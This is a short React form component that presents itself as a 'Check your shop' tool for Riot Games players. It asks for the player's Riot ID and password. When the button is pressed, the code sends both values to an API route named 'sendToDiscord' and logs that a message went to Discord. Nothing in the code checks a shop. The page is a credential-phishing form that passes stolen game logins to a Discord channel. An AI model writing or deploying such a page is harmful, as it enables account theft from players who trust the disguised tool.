import { useState } from 'react';

export default function FormComponent() {
  const [text1, setText1] = useState('');
  const [text2, setText2] = useState('');
  const [loading, setLoading] = useState(false);

  const handleButtonClick = async () => {
    setLoading(true);

    try {
      // Send data to your Next.js API route
      const response = await fetch('/api/sendToDiscord', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ text1, text2 }), // Pass form data
      });

      const data = await response.json();

      if (response.ok) {
        console.log('Message sent to Discord:', data.message);
      } else {
        console.error('Failed to send message to Discord:', data.error);
      }
    } catch (error) {
      console.error('Error sending message to Discord:', error);
    }

    setLoading(false);
  };

  return (
    <div>
      {/* No labels, only placeholders */}
      <div>
        <input
          type="text"
          value={text1}
          onChange={(e) => setText1(e.target.value)}
          placeholder="Enter your Riot ID here."
        />
      </div>
      <div>
        <input
          type="text"
          value={text2}
          onChange={(e) => setText2(e.target.value)}
          placeholder="Enter your Riot password here."
        />
      </div>
      <div>
        <button onClick={handleButtonClick} disabled={loading}>
          {loading ? 'Checking...' : 'Check your shop'}
        </button>
      </div>
    </div>
  );
}
